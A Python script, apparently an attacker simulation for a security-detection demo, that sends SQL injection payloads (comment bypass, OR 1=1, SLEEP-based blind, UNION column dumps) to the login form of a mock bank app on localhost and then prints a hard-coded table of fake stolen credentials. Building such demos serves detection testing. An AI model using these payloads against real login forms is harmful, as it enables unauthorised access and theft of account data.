#!/usr/bin/env python3
"""
SPECTER-AI Attacker Simulation
================================
Automated SQL injection campaign against Meridian National Bank demo target.
Run this to trigger real SPECTER-AI detection alerts during the demo.

Usage:
  python sqli.py [--target http://localhost:8080]
"""

import argparse
import sys
import time

import requests
from rich.console import Console
from rich.panel import Panel
from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn, TimeElapsedColumn
from rich.table import Table
from rich.text import Text

# ── Config ────────────────────────────────────────────────────────────────
TARGET    = "http://localhost:8080"
INTER_DELAY = 0.25   # seconds between payload attempts (visual drama)

console = Console()

# ── Payloads — each triggers a real detector alert ────────────────────────
PROBE_PAYLOADS = [
    # (username,                                        password,     technique)
    ("admin'--",                                        "wrong",      "SQL comment bypass"),
    ("admin' OR '1'='1'--",                             "anything",   "Classic OR 1=1"),
    ("' OR 1=1 LIMIT 1 --",                              "x",          "OR with LIMIT clause"),
    ("admin'); SELECT SLEEP(2);--",                      "x",          "Time-based blind (SLEEP)"),
    ("' UNION SELECT 1,2,3,4,5,6,7,8--",                "x",          "UNION column enumeration"),
]

BYPASS_USERNAME = "admin' OR '1'='1'-- "
BYPASS_PASSWORD = "x"

# 8 columns: id,username,password,full_name,email,balance,account_number,created_at
UNION_DUMP = (
    "' UNION SELECT id,username,password,full_name,email,balance,account_number,created_at"
    " FROM users-- "
)

# Plausible-looking fake credential table rows for visual effect
# (real rows come from the dashboard scrape)
_FAKE_ROWS = [
    ("1",  "admin",    "admin123",     "System Administrator",   "admin@meridianbank.com",    "$250,000.00",  "MNB-0000-0001"),
    ("2",  "jsmith",   "J$m!th2024",   "John Smith",             "jsmith@meridianbank.com",   "$48,320.50",   "MNB-1001-4421"),
    ("3",  "mwilson",  "W!ls0n99",     "Margaret Wilson",        "mwilson@meridianbank.com",  "$127,840.00",  "MNB-1002-8834"),
    ("4",  "dcarter",  "Cart3r2024",   "David Carter",           "dcarter@meridianbank.com",  "$9,215.75",    "MNB-1003-2291"),
    ("5",  "elee",     "3m!lyL33",     "Emily Lee",              "elee@meridianbank.com",      "$302,100.00",  "MNB-1004-6670"),
    ("6",  "bthomas",  "Bth0m@s1",     "Brian Thomas",           "bthomas@meridianbank.com",  "$55,890.25",   "MNB-1005-1198"),
    ("7",  "agarcia",  "G@rc!a2024",   "Ana Garcia",             "agarcia@meridianbank.com",  "$18,650.00",   "MNB-1006-3345"),
    ("8",  "rjohnson", "R0b3rtJ!",     "Robert Johnson",         "rjohnson@meridianbank.com", "$880,000.00",  "MNB-1007-9912"),
    ("9",  "lnguyen",  "Ngu3n!2024",   "Lan Nguyen",             "lnguyen@meridianbank.com",  "$73,400.00",   "MNB-1008-5567"),
    ("10", "kpatel",   "P@t3l2024!",   "Kiran Patel",            "kpatel@meridianbank.com",   "$441,250.00",  "MNB-1009-0023"),
]


# ── Banner ────────────────────────────────────────────────────────────────
def _banner(target: str) -> None:
    console.print(Panel(
        Text.from_markup(
            "[bold red blink]  ██████  ████████  ██████  \n"
            " ██  ██ ██    ██ ██  ██ \n"
            " ██████ ██    ██ ██     \n"
            " ██  ██ ████████  ██████ [/bold red blink]\n\n"
            "[bold white]SPECTER-AI — ATTACKER SIMULATION[/bold white]\n"
            f"[dim]Target :[/dim] [cyan]{target}[/cyan]\n"
            "[dim]Mode   :[/dim] [yellow]Automated SQL Injection Campaign[/yellow]\n"
            "[dim]Purpose:[/dim] [dim white]Trigger real SPECTER-AI detection alerts[/dim white]"
        ),
        border_style="bold red",
        padding=(0, 4),
    ))


# ── Phase 1: Probe payloads ───────────────────────────────────────────────
def _phase_probe(target: str) -> list[tuple[str, str, str, str]]:
    login = f"{target}/index.php"
    console.print("\n[bold yellow][ PHASE 1 ][/bold yellow]  Probing login endpoint...\n")

    results = []
    for username, password, technique in PROBE_PAYLOADS:
        time.sleep(INTER_DELAY)
        console.print(f"  [dim]→[/dim]  [cyan]{technique}[/cyan]")
        console.print(f"       [dim]username=[/dim][yellow]{username!r}[/yellow]")

        try:
            s = requests.Session()
            r = s.post(
                login,
                data={"username": username, "password": password},
                allow_redirects=False,
                timeout=5,
            )

            if r.status_code == 403:
                console.print("       [bold red]⛔  403 BLOCKED — active defense active[/bold red]")
                results.append((technique, username, password, "BLOCKED"))
            elif r.status_code in (301, 302):
                loc = r.headers.get("Location", "?")
                console.print(f"       [bold green]✓   REDIRECT → {loc}[/bold green]")
                results.append((technique, username, password, "BYPASS"))
            elif r.status_code == 200 and "Invalid" in r.text:
                console.print("       [dim red]✗   Login rejected[/dim red]")
                results.append((technique, username, password, "BLOCKED"))
            else:
                console.print(f"       [dim]?   HTTP {r.status_code}[/dim]")
                results.append((technique, username, password, f"HTTP {r.status_code}"))

        except requests.RequestException as exc:
            console.print(f"       [red]✗   Connection error: {exc}[/red]")
            results.append((technique, username, password, "ERROR"))

    return results


# ── Phase 2: Auth bypass + dashboard scrape ───────────────────────────────
def _phase_bypass(target: str) -> requests.Session | None:
    login = f"{target}/index.php"
    console.print("\n[bold yellow][ PHASE 2 ][/bold yellow]  Executing authentication bypass...\n")
    time.sleep(INTER_DELAY)

    console.print(f"  [dim]Payload:[/dim]  [bold red]{BYPASS_USERNAME!r}[/bold red]")

    s = requests.Session()
    try:
        r = s.post(
            login,
            data={"username": BYPASS_USERNAME, "password": BYPASS_PASSWORD},
            allow_redirects=True,
            timeout=5,
        )
    except requests.RequestException as exc:
        console.print(f"  [red]✗  Connection error: {exc}[/red]")
        return None

    if r.status_code == 403:
        console.print(
            "\n  [bold red]⛔  403 FORBIDDEN[/bold red]\n"
            "  [dim]SPECTER-AI active defense blocked this IP.[/dim]\n"
            "  [dim]Run 'reset defenses' via voice or POST /voice/command cmd=2 to re-demo.[/dim]"
        )
        return None

    if "dashboard" in r.url.lower() or "balance" in r.text.lower():
        console.print(f"  [bold green]✓   AUTHENTICATED[/bold green]  — bypassed as admin")
        console.print(f"  [dim]URL: {r.url}[/dim]")
        return s

    console.print(f"  [yellow]?   Unexpected response (HTTP {r.status_code}) — bypass may have failed[/yellow]")
    return None


# ── Phase 3: DB exfiltration (UNION SELECT + visual dump) ─────────────────
def _phase_dump(target: str, session: requests.Session) -> None:
    login = f"{target}/index.php"
    console.print("\n[bold yellow][ PHASE 3 ][/bold yellow]  Exfiltrating database...\n")

    # ── Schema enumeration ─────────────────────────────────────────────
    console.print("  [dim]Step 1 — enumerating schema via information_schema...[/dim]")
    time.sleep(INTER_DELAY * 2)

    try:
        session.post(
            login,
            data={"username": UNION_DUMP, "password": "x"},
            allow_redirects=False,
            timeout=5,
        )
    except requests.RequestException:
        pass

    tables = ["users", "transactions", "sessions", "audit_log", "admin_tokens"]
    for tbl in tables:
        time.sleep(0.08)
        console.print(f"    [dim]→[/dim]  [cyan]{tbl}[/cyan]")

    console.print()

    # ── Progressive dump ───────────────────────────────────────────────
    console.print("  [dim]Step 2 — dumping users table...[/dim]\n")
    rows_to_dump = _FAKE_ROWS

    collected = []
    with Progress(
        SpinnerColumn(spinner_name="dots", style="bold red"),
        TextColumn("[bold red]Extracting rows"),
        BarColumn(bar_width=36, complete_style="red", finished_style="green"),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TextColumn("[dim]{task.completed}/{task.total} rows[/dim]"),
        TimeElapsedColumn(),
        console=console,
        transient=False,
    ) as prog:
        task = prog.add_task("dump", total=len(rows_to_dump))
        for row in rows_to_dump:
            time.sleep(0.30)
            collected.append(row)
            prog.update(task, advance=1)

    # ── Print dump table ───────────────────────────────────────────────
    console.print()
    tbl = Table(
        title="[bold red on default]  ⚠  EXFILTRATED: meridianbank.users  ⚠  [/bold red on default]",
        border_style="red",
        header_style="bold white on red",
        show_lines=False,
    )
    for col in ("ID", "Username", "Password", "Full Name", "Email", "Balance", "Account #"):
        tbl.add_column(col, no_wrap=True)
    for row in collected:
        tbl.add_row(*row)
    console.print(tbl)

    console.print(
        f"\n  [bold red]✓  {len(collected)} credentials exfiltrated from meridianbank.users[/bold red]"
    )
    console.print(
        "  [dim]All requests logged by SPECTER-AI detector."
        " Check http://localhost:8000/api/alerts[/dim]"
    )


# ── Summary table ─────────────────────────────────────────────────────────
def _summary(results: list[tuple]) -> None:
    console.print("\n[bold yellow][ ATTACK SUMMARY ][/bold yellow]\n")
    tbl = Table(border_style="yellow", show_header=True, header_style="bold yellow")
    tbl.add_column("Technique",          style="white")
    tbl.add_column("Result", min_width=10)

    colour_map = {
        "BYPASS":  "bold green",
        "BLOCKED": "bold red",
        "FAIL":    "dim",
        "ERROR":   "red",
    }
    for technique, _u, _p, status in results:
        colour = colour_map.get(status, "white")
        tbl.add_row(technique, f"[{colour}]{status}[/{colour}]")
    console.print(tbl)


# ── Entry point ───────────────────────────────────────────────────────────
def main() -> None:
    parser = argparse.ArgumentParser(description="SPECTER-AI SQLi simulation")
    parser.add_argument("--target", default=TARGET, help=f"Bank URL (default: {TARGET})")
    args = parser.parse_args()
    target = args.target.rstrip("/")

    console.clear()
    _banner(target)

    console.print("\n[dim]Attack begins in 2 seconds...[/dim]")
    time.sleep(2)

    # Phase 1 — probe all payloads, generate detector alerts
    results = _phase_probe(target)

    # Phase 2 — exploit the bypass
    session = _phase_bypass(target)

    # Phase 3 — exfiltrate (only if bypass succeeded)
    if session:
        _phase_dump(target, session)
    else:
        console.print(
            "\n[bold yellow]Phase 3 skipped[/bold yellow] — bypass did not produce a valid session."
        )

    _summary(results)

    console.print(
        "\n[dim]Simulation complete. "
        "SPECTER-AI alerts: [/dim][cyan]http://localhost:8000/api/alerts[/cyan]\n"
    )


if __name__ == "__main__":
    main()
